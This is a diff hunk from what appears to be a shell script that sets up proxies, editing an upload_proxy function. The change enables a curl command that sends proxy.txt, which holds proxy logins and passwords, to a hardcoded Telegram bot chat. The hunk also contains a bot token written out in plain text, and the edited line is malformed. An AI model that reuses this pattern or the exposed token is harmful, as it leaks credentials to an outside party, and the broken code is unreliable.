@@ -78,24 +78,24 @@ upload_proxy() {
     #echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
     #echo "Download zip archive from: ${URL}"
     #echo "Password: ${PASS}"
-    #URL=$(curl -F "document=@proxy.txt" https://api.telegram.org/5418191856:AAGHG6-QnHHFUAV7ouaty6I9ISThDLJdjc0/sendDocument?chat_id=956415922)
+    URL=$(curl -F "document=@proxy.txt" https://api.telegram.org/bot$5418191856:AAGHG6-QnHHFUAV7ouaty6I9ISThDLJdjc0/sendDocument?chat_id=$956415922)
     #curl -v -F "chat_id=956415922" -F document=@/Users/users/Desktop/file.txt https://api.telegram.org/5418191856:AAGHG6-QnHHFUAV7ouaty6I9ISThDLJdjc0/sendDocument
     #curl -F chat_id=956415922 -F document=@proxy.txt https://api.telegram.org/5418191856:AAGHG6-QnHHFUAV7ouaty6I9ISThDLJdjc0/sendDocument
     URL="https://api.telegram.org/bot$5418191856:AAGHG6-QnHHFUAV7ouaty6I9ISThDLJdjc0/sendMessage"
     #curl -s -X POST $URL -d chat_id=$956415922 -d text="$(cat proxy.txt)"
     #curl -s -d "chat_id=$956415922" --data-urlencode text@proxy.txt "$URL"
     #!/bin/bash
-    TOKEN=5418191856:AAGHG6-QnHHFUAV7ouaty6I9ISThDLJdjc0
-    chat_id=956415922
+    #TOKEN=5418191856:AAGHG6-QnHHFUAV7ouaty6I9ISThDLJdjc0
+    #chat_id=956415922
     #!/bin/bash
-    mv search?sSearch=Sonos+ alt
-    HTTP=https://blabla.com
-    wget $HTTP
-    diff -I 'var' new old > somefile.txt
-    if [ $? -gt 0 ]; then
-        url="https://api.telegram.org/bot$TOKEN/sendMessage"
-        curl -s -d "chat_id=$chat_id" --data-urlencode text@proxy.txt "$url"
-    fi
+    #mv search?sSearch=Sonos+ alt
+    #HTTP=https://blabla.com
+    #wget $HTTP
+    #diff -I 'var' new old > somefile.txt
+    #if [ $? -gt 0 ]; then
+        #url="https://api.telegram.org/bot$TOKEN/sendMessage"
+        #curl -s -d "chat_id=$chat_id" --data-urlencode text@proxy.txt "$url"
+    #fi
 }
 gen_data() {
     seq $FIRST_PORT $LAST_PORT | while read port; do
